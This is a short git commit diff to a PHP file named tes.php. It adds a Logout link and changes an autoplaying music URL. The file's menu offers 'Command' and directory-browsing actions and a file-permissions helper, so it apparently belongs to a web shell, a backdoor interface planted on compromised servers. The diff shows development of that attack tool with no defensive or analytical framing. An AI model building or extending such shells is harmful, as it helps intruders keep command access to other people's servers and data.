9034bfa26039218f0b55b7802fa31125bcfb815f
Z4PHY <mahardidono@gmail.com>
2024-02-22 16:47:56 +0700

    Z4PHY

--- other/tes.php
+++ other/tes.php
@@ -167,6 +167,7 @@ echo "</table>";
 echo "<center>";
 echo "<center><table id='menu' width='990' border='0' cellpadding='0' cellspacing='0'><tr><td>";
 echo "<a class='destroy_table' href='?'>Home</a>";
+echo "<a class='destroy_table' href='?logout=true'>Logout</a>";
 echo "<a class='destroy_table' href='?dir=$dir&to=z4phy'>Gasspoll!</a>";
 echo "<a class='destroy_table' href='?dir=$dir&to=z4p'>Gasskeun!!</a><br>";
 echo "<a class='destroy_table' href='?dir=$dir&to=cmd'>Command</a>";
@@ -442,7 +443,7 @@ echo '</center></td>
 echo '</table>
 </div>';
 }
-echo '<center><audio autoplay="autoplay" controls="controls" src="https://kacamataopung.com/assets/DJ-WYNTELLA.mp3" type="audio/mpeg"></audio></center>
+echo '<center><audio autoplay="autoplay" controls="controls" src="https://h.top4top.io/m_16378jw0k0.m3" type="audio/mpeg"></audio></center>
 </body>
 </html>';
 function perms($file){
